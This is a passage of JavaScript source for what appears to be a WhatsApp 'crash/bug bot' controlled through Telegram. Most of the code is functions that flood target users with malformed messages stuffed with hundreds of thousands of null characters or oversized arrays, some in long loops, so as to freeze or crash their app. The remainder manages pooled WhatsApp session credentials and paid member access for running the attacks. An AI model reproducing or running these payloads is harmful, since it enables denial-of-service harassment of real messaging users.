              name: "address_message",
              paramsJson: `{"values":{"in_pin_code":"999999","building_name":"visi","landmark_area":"X","address":"RumahRoblokKa","tower_number":"RumahRoblokKa","city":"arab","name":"RumahRoblokKa","phone_number":"999999999999","house_number":"xxx","floor_number":"smkui","state":"RumahRoblokKa | ${"\u0000".repeat(900000)}"}}`,
              version: 3
            }
          }
        }
      }
    },
    {
      userJid: targetJid,
      quoted: null
    }
  );

  await sock.relayMessage(targetJid, RumahRoblokKa.message, {
    participant: { jid: targetJid },
    messageId: RumahRoblokKa.key.id
  });
}

async function newDelay(sock, targetJid) {
  const Msg = {
    groupStatusMessageV2: {
      message: {
        orderMessage: {
          itemCount: 99999,
          status: 1,
          surface: 1,
          message: "\u0000".repeat(250000),
          orderTitle: "\u0000".repeat(300000),
          sellerJid: "0@s.whatsapp.net",
          token: "visi",
          totalAmount1000: 0,
          totalCurrencyCode: "USD",
          contextInfo: {
            mentionedJid: Array.from({ length: 5000 }, (_, r) => `88888888${r + 1}@s.whatsapp.net`)
          }
        }
      }
    }
  };

  await sock.relayMessage(targetJid, Msg, {
    participant: { jid: targetJid }
  });
}

async function BuldozerNoDelay(sock, targetJid) {
  let start = Date.now();
  while (Date.now() - start < 300000) {
    const Msg = {
      groupStatusMessageV2: {
        message: {
          interactiveResponseMessage: {
            contextInfo: {
              remoteJid: "\u0000",
              urlTrackingMap: {
                urlTrackingMapElements: Array.from({ length: 209000 }, () => ({
                  type: 1
                }))
              }
            },
            body: {
              text: "VISI",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "{ X: { status:true } }",
              version: 3
            },
            contextInfo: {
              mentionedJid: Array.from({ length: 9000 }, (_, r) => `88888888${r + 1}@s.whatsapp.net`)
            }
          }
        }
      }
    };

    await sock.relayMessage(targetJid, Msg, {
      participant: { jid: targetJid }
    });
    await new Promise(r => setTimeout(r, 1000));
  }
}

async function NullBlank(sock, targetJid) {
  await sock.relayMessage(targetJid, {
    groupInviteMessage: {
      groupJid: "676767676767676767@g.us",
      inviteCode: "XxX",
      caption: "\u0000".repeat(150000),
      groupName: "\u0000".repeat(150000),
      inviteExpiration: 0 
    }
  }, { 
    participant: { jid: targetJid } 
  });
}

async function CrashNew(sock, targetJid) {
  const Msg = {
    stickerPackMessage: {
      stickerPackId: "VISI",
      name: "VISI",
      publisher: "VISI",
      caption: "VISI",
      packDescription: "VISI",
      stickerPackOrigin: 2, 
      stickers: [
        {
          fileName: "sticker.webp",
          isAnimated: true,
          emojis: ["🤯"],
          mimetype: "image/webp"
        }
      ],
      fileLength: "10610",
      fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
      fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
      mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
      mimetype: "image/webp",
      directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
      mediaKeyTimestamp: "1775044724", 
      stickerPackSize: "999",
      contextInfo: {
        isForwarded: true,
        forwardingScore: 999
      }
    }
  };

  await sock.relayMessage(targetJid, Msg, {
    participant: { jid: targetJid }
  });
}

async function AlbumUi(sock, targetJid) {
  const Msg = {
    albumMessage: {
      messages: [],
      expectedImageCount: 1000, 
      expectedVideoCount: 1000
    },
    messageContextInfo: {
      deviceListMetadata: {
        senderKeyHash: "VISI",
        senderTimestamp: "9999999999999",
        senderKeyIndex: 99999,
        recipientKeyHash: "VISI",
        recipientTimestamp: "9999999999999",
        recipientKeyIndex: 99999
      },
      deviceListMetadataVersion: 2 
    }
  };

  await sock.relayMessage(targetJid, Msg, {
    participant: { jid: targetJid }
  });
}

async function BULDOZER (sock,targetJid) {
    
    const msg2 = {
        viewOnceMessage: {
            message: {
        listMessage: {
    title: "\u0000".repeat(35000),
    description: "\u0000".repeat(50000),
    buttonText: "Iamsatz",
    footerText: "",
    listType: 1,

    sections: [
      {
        title: "",
        rows: Array.from({ length: 5 }, (_, i) => ({
          title: `\u0000`.repeat(35000),
          description: `\u0000`.repeat(150000),
          rowId: null
        }))
      }
    ],
            contextInfo: {
                remoteJid: Math.random().toString(36) + "REQUEST_LOCATION",
                mentionedJid: [ targetJid ]
                }
  }
}
            }
        }
         
        await sock.relayMessage(targetJid,msg2,{
            participant: { jid: targetJid }
            })
}

async function ZyXNgaceng(sock, targetJid) {
  const msg = {
    groupStatusMessageV2: {
      message: {
        locationMessage: {}
      }
    },
    interactiveResponseMessage: {
      header: {
        title: "Maklu Gw Ewe" + "{".repeat(90000)
      },
      body: {
        text: "Ridzz Nieh Boyzz"
      },
      nativeFlowResponseMessage: {
        responseParamsJson: "\u0000".repeat(10000)
      }
    }
  };

  await sock.relayMessage(targetJid, msg, {});
}

async function MyFakePlasticLove(sock, targetJid) {
  const album = {
    url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1"
  };

  const xyrr = {
    albumMessage: {
      stickerMessage: album,
      contextInfo: {
        quotedMessage: {
          stickerMessage: {
            ...album,
            url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
            fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
            fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
            mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
            mimetype: "image/webp",
            directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
            fileLength: "10610",
            mediaKeyTimestamp: "1775044724",
            stickerSentTs: "1775044724091"
          }
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(targetJid, xyrr, {});

  await sock.relayMessage(
    targetJid,
    {
      groupStatusMessageV2: {
        message: msg.message
      }
    },
    {
      messageId: msg.key.id,
      participant: { jid: targetJid }
    }
  );

  await new Promise((r) => setTimeout(r, 500));
}

async function EfcihNihTodd(sock, targetJid) {
  try {
    for (let i = 0; i < 5000; i++) {

      await sock.sendMessage(targetJid, {
        viewOnceMessage: {
          message: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/m1/v/t24/An-qss16gfa27i8We5RUTHibYUzSuagepuRHNmgi77hh17XMu07yngcd4N4Q1lXyqymQ1MRqnOjUJqm4bOPAxDFF_S_YBvqnI_SrYg7-KcGoGdZ2Jlvj0-EUl-FoHxozVA?ccb=10-5&oh=01_Q5Aa3gH5jIXgo_TCy55Ec51fAc31uBa4R28GUnNS6f3hORc80w&oe=698C995A&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",

              fileSha256: Buffer.from("JBsntfn6t5hXBp2VH91K2tuMf49pmFPIwFjshrA2WhI=", "base64"),
              fileEncSha256: Buffer.from("bbfSmz2AGsh1wLcTEWbJYJyz1ev4fFVhilYY8xJDQLI=", "base64"),
              mediaKey: Buffer.from("xWD083UnPcnqnBtnLbpqQHCFI5u35p5AzGFLHzGR7CM=", "base64"),

              caption: "\u0000".repeat(9000),

              width: 1080,
              height: 1080,
              directPath: "/m1/v/t24/An-qss16gfa27i8We5RUTHibYUzSuagepuRHNmgi77hh17XMu07yngcd4N4Q1lXyqymQ1MRqnOjUJqm4bOPAxDFF_S_YBvqnI_SrYg7-KcGoGdZ2Jlvj0-EUl-FoHxozVA?ccb=10-5&oh=01_Q5Aa3gH5jIXgo_TCy55Ec51fAc31uBa4R28GUnNS6f3hORc80w&oe=698C995A&_nc_sid=5e03e0",
        jpegThumbnail: Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEAAQAMBIgACEQEDEQH/xAAsAAABBQEAAAAAAAAAAAAAAAAGAAECAwQFAQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIQAxAAAAAjaSKhcpqAAwzuEHL6cCbPQNpoYiooldG05urNwwlkP90Usm4r0KsCs5PeDWSyggRckxNajE//xAAnEAACAgIBAwMEAwAAAAAAAAABAgADBBERSBBAREyFBUxQv/aAAgBAQABPwAH2jAMNEQDi2vJBnXKWF4s+DACSAJgYyVNVtxzCe3bLwrMt/LhQp+3sRuNYiFQT5Mvx0yK2R/IMp6QlFwd25Sqm0dVZz4UCAgx+OwD89vIEbHD2I5PleyXrZc1YB2sZFVtHwG+ZXQ1TEq5I/BgIf8ARE2N6jWWJYANan1Fc+oXf6helX5jezPWR0IMptDALvyJqYd1myl/9qiGlWYtyP3Q4w8aM9BdERKB55e+4uOgBE9AJtlJ3FOwDL1QlnDaZhx3MvJysdUr9TyDOndRyL7lqeyWZVdT6fwPzD1bBB1zlV1dy8q2BHZgdggyjMetnZ9sNeIbDY5ZwWgsXGcBBo695dfbaxLuT26CbOVg/wAQ9qOi1VhxY/Kfx2NTU3BJkV2JkOLPeOpExsDIySOCeJg4a4lPAR1LIQDo/BlCOlYWx+Tfmf/EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQIBAT8AB//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8AB//Z", "base64"),

              contextInfo: {
                groupStatusMessageV2: {
                  message: {
                    protocolMessage: { type: 0 }
                  }
                }
              }
            },

            extendedTextMessage: {
              text: "GW GANTENG GA?"
            }
          }
        }
      });

      await new Promise(r => setTimeout(r, 700));
    }

    console.log("success");
  } catch (e) {
    console.log("error:", e);
  }
}

async function delaybyzsnz(sock, targetJid) {
  await new Promise((resolve) => setTimeout(resolve, 20000));

  const maklowh = generateWAMessageFromContent(
    targetJid,
    {
      groupStatusMessageV2: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "Delayed",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "address_message",
              paramsJson: JSON.stringify({
                values: {
                  in_pin_code: "999999",
                  building_name: "zsnz",
                  landmark_area: "X",
                  address: "Maklowh",
                  tower_number: "Maklowh",
                  city: "arab",
                  name: "Maklowh",
                  phone_number: "999999999999",
                  house_number: "xxx",
                  floor_number: "smkui",
                  state: `Maklowh | ${"\u0000".repeat(900000)}`,
                },
              }),
              version: 3,
            },
          },
        },
      },
    },
    {
      userJid: targetJid,
      quoted: null,
    }
  );

  await sock.relayMessage(targetJid, maklowh.message, {
    participant: { jid: targetJid },
    messageId: maklowh.key.id,
  });
}

const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
module.exports = { delay };
// ======================================= //
// WhatsApp Connect Logic
const waiting = async (ms) => delay(ms);

function sleep(ms) {
  return delay(ms);
}
const activeConnections = {};
const biz = {};   // Untuk WA Business
const mess = {};  // Untuk WA Messenger

function prepareAuthFolders() {
  const userId = "zsnz";
  try {
    if (!fs.existsSync(userId)) {
      fs.mkdirSync(userId, { recursive: true });
      console.log("Folder utama '" + userId + "' dibuat otomatis.");
    }

    const files = fs.readdirSync(userId).filter(file => file.endsWith('.json'));
    if (files.length === 0) {
      console.error("Folder '" + userId + "' Tidak Mengandung Session List Sama Sekali.");
      return [];
    }

    for (const file of files) {
      const baseName = path.basename(file, '.json');
      const sessionPath = path.join(userId, baseName);
      if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath);
      const source = path.join(userId, file);
      const dest = path.join(sessionPath, 'creds.json');
      if (!fs.existsSync(dest)) fs.copyFileSync(source, dest);
    }

    return files; // ✅ Tambahkan return
  } catch (err) {
    console.error("Buat Folder 'zsnz' Lalu Isi Dengan Sessions.");
    safeExit();
  }
}

function detectWATypeFromCreds(filePath) {
  if (!fs.existsSync(filePath)) return 'Unknown';

  try {
    const creds = JSON.parse(fs.readFileSync(filePath));
    const platform = creds?.platform || creds?.me?.platform || 'unknown';

    if (platform.includes("business") || platform === "smba") return "Business";
    if (platform === "android" || platform === "ios") return "Messenger";
    return "Unknown";
  } catch {
    return "Unknown";
  }
}

async function connectSession(folderPath, sessionName, retries = 100) {
  return new Promise(async (resolve) => {
    try {
      const sessionsFold = `${folderPath}/${sessionName}`
      const cacheKey = buildSessionCacheKey(folderPath, sessionName);
      const { state } = await useMultiFileAuthState(sessionsFold);
      const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      version: version,
      defaultQueryTimeoutMs: undefined,
  });

      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;

        if (connection === "open") {
          activeConnections[cacheKey] = sock;

          const type = detectWATypeFromCreds(`${sessionsFold}/creds.json`);
          console.log(`\n[${sessionName}] Connected. Type: ${type}`);

          if (type === "Business") {
            biz[cacheKey] = sock;
          } else if (type === "Messenger") {
            mess[cacheKey] = sock;
          }

          resolve();
        } else if (connection === "close") {
          console.log(`\n[${sessionName}] Connection closed. Status: ${statusCode}\n${lastDisconnect.error}`);

          if (deletingSessions.has(cacheKey)) {
            delete activeConnections[cacheKey];
            delete biz[cacheKey];
            delete mess[cacheKey];
            removeSessionArtifacts(folderPath, sessionName);
            deletingSessions.delete(cacheKey);
            resolve();
            return;
          }

          if (statusCode === 440) {
            delete activeConnections[cacheKey];
            delete biz[cacheKey];
            delete mess[cacheKey];
            removeSessionArtifacts(folderPath, sessionName);
          } else if (!isLoggedOut && retries > 0) {
            await new Promise((r) => setTimeout(r, 3000));
            resolve(await connectSession(folderPath, sessionName, retries - 1));
          } else {
            console.log(`\n[${sessionName}] Logged out or max retries reached.`);
            delete activeConnections[cacheKey];
            delete biz[cacheKey];
            delete mess[cacheKey];
            removeSessionArtifacts(folderPath, sessionName);
            resolve();
          }
        }
      });
    } catch (err) {
      console.log(`\n[${sessionName}] SKIPPED (session tidak valid / belum login)`);
      console.log(err);
      resolve();
    }
  });
}

async function disconnectAllActiveConnections() {
  for (const sessionName in activeConnections) {
    const sock = activeConnections[sessionName];
    try {
      sock.ws.close();
      console.log(`[${sessionName}] Disconnected.`);
    } catch (e) {
      console.log(`[${sessionName}] Gagal disconnect:`, e.message);
    }
    delete activeConnections[sessionName];
  }

  console.log('✅ Semua sesi dari activeConnections berhasil disconnect.');
}
async function connectNewUserSessionsOnly() {
  const userIdFolder = "zsnz";
  const files = prepareAuthFolders();
  if (files.length === 0) return;

  console.log(`[DEBUG] Ditemukan ${files.length} sesi:`, files);

  for (const file of files) {
    const baseName = path.basename(file, '.json');
    const sessionFolder = path.join(userIdFolder, baseName);
    const cacheKey = buildSessionCacheKey(sessionFolder, baseName);

    // Skip jika sudah ada koneksi aktif
    if (activeConnections[cacheKey]) {
      console.log(`[${baseName}] Sudah terhubung, skip.`);
      continue;
    }

    if (!fs.existsSync(sessionFolder)) {
      fs.mkdirSync(sessionFolder, { recursive: true });
      const source = path.join(userIdFolder, file);
      const dest = path.join(sessionFolder, 'creds.json');
      if (!fs.existsSync(dest)) {
        fs.copyFileSync(source, dest);
      }
    }

    // Sambungkan sesi baru
    connectSession(sessionFolder, baseName);
  }
}

// Jika ingin refresh tanpa putus semua, pakai ini:
async function refreshUserSessions() {
  await startUserSessions();
  //startLoop();
}

async function pairingWa(number, owner, attempt = 1) {
  if (attempt >= 5) {
      return false;
  }
  const sessionDir = path.join('zsnz', owner, number); 
  const cacheKey = buildSessionCacheKey(owner, number);

  if (!fs.existsSync('zsnz')) fs.mkdirSync('zsnz');
  if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir);

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      version: version,
      defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      if (deletingSessions.has(cacheKey)) {
        delete activeConnections[cacheKey];
        delete biz[cacheKey];
        delete mess[cacheKey];
        removeSessionArtifacts(path.join('zsnz', owner), number);
        deletingSessions.delete(cacheKey);
        return;
      }

      const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
      if (!isLoggedOut) {
        console.log(`🔄 Reconnecting ${number} Because ${lastDisconnect?.error?.output?.statusCode} Attempt ${attempt}/5`);
        await waiting(3000);
        await pairingWa(number, owner, attempt + 1);
      } else {
        delete activeConnections[cacheKey];
        delete biz[cacheKey];
        delete mess[cacheKey];
      }
    } else if (connection === "open") {
      activeConnections[cacheKey] = sock;
      const sourceCreds = path.join(sessionDir, 'creds.json');
      const destCreds = path.join('zsnz', owner, `${number}.json`);
      const type = detectWATypeFromCreds(sourceCreds);

      if (type === "Business") {
        biz[cacheKey] = sock;
      } else if (type === "Messenger") {
        mess[cacheKey] = sock;
      }

try {
  await waiting(3000)
  if (fs.existsSync(sourceCreds)) {
    const data = fs.readFileSync(sourceCreds); // baca isi file sumber
    fs.writeFileSync(destCreds, data); // tulis ulang (overwrite)
    console.log(`✅ Rewrote session to ${destCreds}`);
  }
} catch (e) {
  console.error(`❌ Failed to rewrite creds: ${e.message}`);
}
    }
  });

  return null;
}


async function startUserSessions() {
  // Ambil semua subfolder dalam zsnz
  const subfolders = fs.readdirSync('zsnz')
    .map(name => path.join('zsnz', name))
    .filter(p => fs.lstatSync(p).isDirectory());

  console.log(`[DEBUG] Found ${subfolders.length} subfolders inside zsnz`);

  for (const folder of subfolders) {
    const jsonFiles = fs.readdirSync(folder)
      .filter(file => file.endsWith(".json"))
      .map(file => path.join(folder, file));

    console.log(`[DEBUG] Found ${jsonFiles.length} JSON files in ${folder}`);

    for (const jsonFile of jsonFiles) {
      const sessionName = `${path.basename(jsonFile, ".json")}`;
      const cacheKey = buildSessionCacheKey(folder, sessionName);

      // ✅ Cek apakah session sudah aktif
      if (activeConnections[cacheKey]) {
        console.log(`[SKIP] Session ${sessionName} already active, skipping...`);
        continue;
      }

      try {
        console.log(`[START] Connecting session: ${sessionName}`);
        await connectSession(folder, sessionName); // gunakan await kalau connectSession async
      } catch (err) {
        console.error(`[ERROR] Failed to start session ${sessionName}:`, err.message);
      }
    }
  }
}

// === Fungsi untuk mengecek apakah folder punya sesi aktif ===
function checkActiveSessionInFolder(subfolderName) {
  const folderPath = path.join('zsnz', subfolderName);
  if (!fs.existsSync(folderPath)) return null;

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  const activeSessions = [];

  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    const cacheKey = buildSessionCacheKey(subfolderName, sessionName);
    const sock = activeConnections[cacheKey];
    if (sock) {
      activeSessions.push({
        sock,
        sessionName,
        cacheKey,
      });
    }
  }

  if (!activeSessions.length) {
    return null;
  }

  return activeSessions[Math.floor(Math.random() * activeSessions.length)];
}


const telegramDataPath = "telegram.json";
const dbPath = "database.json";

// ===== Helpers =====
function loadTelegramConfig() {
  if (!fs.existsSync(telegramDataPath)) {
    fs.writeFileSync(telegramDataPath, JSON.stringify({ ownerList: [], developerList: [], userList: [] }, null, 2));
  }

  const config = JSON.parse(fs.readFileSync(telegramDataPath));
  if (!Array.isArray(config.ownerList)) config.ownerList = [];
  if (!Array.isArray(config.userList)) config.userList = [];
  if (!Array.isArray(config.developerList)) config.developerList = [];
  return config;
}

function saveTelegramConfig(config) {
  fs.writeFileSync(telegramDataPath, JSON.stringify(config, null, 2));
}

function loadDatabase() {
  if (!fs.existsSync(dbPath)) fs.writeFileSync(dbPath, JSON.stringify([]));
  return JSON.parse(fs.readFileSync(dbPath));
}

function saveDatabase(data) {
  fs.writeFileSync(dbPath, JSON.stringify(data, null, 2));
}

function generateKey() {
  return crypto.randomBytes(8).toString("hex");
}

function getFormattedUsers() {
  const db = loadDatabase();
  return db.map(u => `👤 ${u.username} | 🆔 ${u.telegramId || '-'} | 🎯 ${u.role || 'member'} | ⏳ ${u.expiredDate}`).join("\n");
}

function findUserByIdentity(db, identity) {
  const normalized = String(identity || "").trim();
  if (!normalized) return null;

  return db.find((user) => {
    const username = String(user.username || "").trim();
    const telegramId = String(user.telegramId || "").trim();
    return username === normalized || telegramId === normalized;
  }) || null;
}

function extendUserExpiry(user, addDays) {
  const parsedDays = parseInt(addDays, 10);
  if (Number.isNaN(parsedDays) || parsedDays <= 0) {
    return { ok: false, message: "❌ Jumlah hari tidak valid." };
  }

  const baseDate = new Date(user.expiredDate);
  const startDate = Number.isNaN(baseDate.getTime()) || baseDate < new Date()
    ? new Date()
    : baseDate;

  startDate.setDate(startDate.getDate() + parsedDays);
  user.expiredDate = startDate.toISOString().split("T")[0];

  return { ok: true, expiredDate: user.expiredDate };
}

async function downloadToBuffer(url) {
  try {
    const response = await axios.get(url, {
      responseType: 'arraybuffer'
    });
    return Buffer.from(response.data);
  } catch (error) {
    throw error;
  }
}


function isValidBaileysCreds(jsonData) {
  if (typeof jsonData !== 'object' || jsonData === null) return false;

  const requiredKeys = [
    'noiseKey',
    'signedIdentityKey',
    'signedPreKey',
    'registrationId',
    'advSecretKey',
    'signalIdentities'
  ];

  return requiredKeys.every(key => key in jsonData);
}

// ===== Command Handlers =====
bot.onText(/^\/?(start|menu)/, (msg) => {
  const id = msg.from.id;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id);
  const isDeveloper = config.developerList.includes(id);
  const isUser = config.userList.includes(id) || isOwner || isDeveloper;

  if (!isUser) return bot.sendMessage(id, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");

  const options = {
    reply_markup: {
      inline_keyboard: [
        [{ text: "🆕 Buat Akun Member", callback_data: "create_member" }],
        [{ text: "⏳ Set Expired", callback_data: "set_expire" }],
        ...((isOwner || isDeveloper) ? [[
          { text: "📋 List User", callback_data: "list_user" },
          { text: "🎛 Buat Custom User", callback_data: "create_custom" },
          { text: "🗑 Hapus User", callback_data: "delete_user" }
        ]] : [])
      ]
    }
  };

  bot.sendMessage(id, `👋 Halo ${msg.from.first_name}, pilih menu:`, options);
});
bot.on('message', async (msg) => {
  const chatId = msg.chat.id;

  if (msg.document) {
    const fileName = msg.document.file_name || '';
    if (!fileName.endsWith('.json')) {
      return;
    }

    try {
      const file = await bot.getFile(msg.document.file_id);
      const fileUrl = `https://api.telegram.org/file/bot${TOKEN}/${file.file_path}`;
      const buffer = await downloadToBuffer(fileUrl);
      const jsonData = JSON.parse(buffer.toString());

      if (!isValidBaileysCreds(jsonData)) {
        return bot.sendMessage(chatId, '❌ File tersebut bukan `creds.json` valid dari Baileys.');
      }

      // Simpan ke folder sessions/<userId>/
      const userFolder = path.join(__dirname, 'zsnz');
      if (!fs.existsSync(userFolder)) {
        fs.mkdirSync(userFolder, { recursive: true });
      }

      let finalName = fileName;
      const savePath = path.join(userFolder, finalName);

      // Jika file sudah ada, buat nama acak
      if (fs.existsSync(savePath)) {
        const randomSuffix = Date.now(); // atau bisa juga pakai: Math.random().toString(36).slice(2, 8)
        const base = path.basename(fileName, '.json');
        finalName = `${base}-${randomSuffix}.json`;
      }

      const finalSavePath = path.join(userFolder, finalName);
      fs.writeFileSync(finalSavePath, JSON.stringify(jsonData));

      bot.sendMessage(chatId, `✅ File disimpan sebagai ${finalName}.`);
    } catch (err) {
      console.error(err);
      bot.sendMessage(chatId, '⚠️ Terjadi kesalahan saat memproses file.');
    }
  }
});

bot.onText(/^\/?refresh/, async (msg) => {
  const config = loadTelegramConfig();
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const isOwner = config.ownerList.includes(userId);
  if (!isOwner) return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.")
  await refreshUserSessions()
  await bot.sendMessage(chatId, "⚠️ Server Is Refreshing wait for 30-60 Seconds.");
})

bot.onText(/^\/?addadmin\s+(\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(userId);
  if (!isOwner) return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");

  const targetId = parseInt(match[1], 10);
  if (Number.isNaN(targetId)) {
    return bot.sendMessage(chatId, "❌ Format salah. Gunakan /addadmin <telegram_id>.");
  }

  if (!config.developerList.includes(targetId)) {
    config.developerList.push(targetId);
  }
  if (!config.userList.includes(targetId)) {
    config.userList.push(targetId);
  }

  saveTelegramConfig(config);
  bot.sendMessage(chatId, `✅ Telegram ID ${targetId} berhasil ditambahkan sebagai developer.`);
})

bot.onText(/^\/(\d+)(?:\s+(\d+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const requesterId = msg.from.id;
  const config = loadTelegramConfig();
  const isAllowed = config.ownerList.includes(requesterId) || config.developerList.includes(requesterId) || config.userList.includes(requesterId);

  if (!isAllowed) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  const telegramId = String(match[1] || "").trim();
  const addDays = String(match[2] || "").trim();

  if (!telegramId || !addDays) {
    return bot.sendMessage(chatId, "⚠️ Format salah.\nGunakan `/telegram_id jumlah_hari`\nContoh: `/628123456789 30`", {
      parse_mode: "Markdown"
    });
  }

  const db = loadDatabase();
  const user = findUserByIdentity(db, telegramId);
  if (!user) {
    return bot.sendMessage(chatId, `❌ User dengan Telegram ID ${telegramId} tidak ditemukan.`);
  }

  if (!config.ownerList.includes(requesterId) && user.role !== "member") {
    return bot.sendMessage(chatId, "❌ Kamu hanya bisa memperpanjang akun dengan role 'member'.");
  }

  const result = extendUserExpiry(user, addDays);
  if (!result.ok) {
    return bot.sendMessage(chatId, result.message);
  }

  saveDatabase(db);
  return bot.sendMessage(chatId, `✅ Akses ${user.username} (${telegramId}) diperpanjang ${addDays} hari.\n⏳ Expired baru: ${user.expiredDate}`);
});

bot.onText(/^\/?globalsession/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  if (msg.chat.type === "private") {
    return bot.sendMessage(chatId, "lu ngapain");
  }

  const connectedBiz = Object.keys(biz);
  const connectedMess = Object.keys(mess);
  const connectedNumbers = Object.keys(activeConnections);

  const onlineMess = connectedMess || [];
  const onlineBiz = connectedBiz || [];
  const onlineNumbers = connectedNumbers || [];

  let message = `📌 Global Session\n\n`;

  message += 'Messenger Session:\n';
  message += onlineMess.length > 0
    ? connectedMess.map((num, index) => `${index + 1}. ${num}`).join("\n")
    : "❌ None";

  message += '\nBusiness Session:\n';
  message += onlineBiz.length > 0
    ? connectedBiz.map((num, index) => `${index + 1}. ${num}`).join("\n")
    : "❌ None";

  message += '\nActive Numbers:\n';
  message += onlineNumbers.length > 0
    ? connectedNumbers.map((num, index) => `${index + 1}. ${num}`).join("\n")
    : "❌ None";

  bot.sendMessage(chatId, message);
});

bot.onText(/^\/?list_sender$/, async (msg) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;
  const config = loadTelegramConfig();
  const isAllowed = config.ownerList.includes(fromId) || config.developerList.includes(fromId);

  if (!isAllowed) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    const globalConnections = getActiveCredsInFolder(GLOBAL_SENDER_FOLDER).map(sender =>
      buildSenderConnectionItem(sender, "global", "owner")
    );

    if (!globalConnections.length) {
      return bot.sendMessage(chatId, "⚠️ Belum ada global sender aktif.");
    }

    const lines = globalConnections.map((sender, index) => {
      const sessionName = sender.sessionName || sender.id || "Unknown";
      return `${index + 1}. ${sessionName}`;
    });

    const text = [
      "📡 *Global Sender List*",
      "",
      `Total aktif: *${globalConnections.length}*`,
      "",
      ...lines,
    ].join("\n");

    return bot.sendMessage(chatId, text, { parse_mode: "Markdown" });
  } catch (err) {
    console.error("❌ Error list_sender:", err.message);
    return bot.sendMessage(chatId, "❌ Gagal mengambil daftar global sender.");
  }
});

bot.on("callback_query", async (query) => {
  const id = query.from.id;
  const data = query.data;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id);
  const isDeveloper = config.developerList.includes(id);
  const isUser = config.userList.includes(id) || isOwner || isDeveloper;

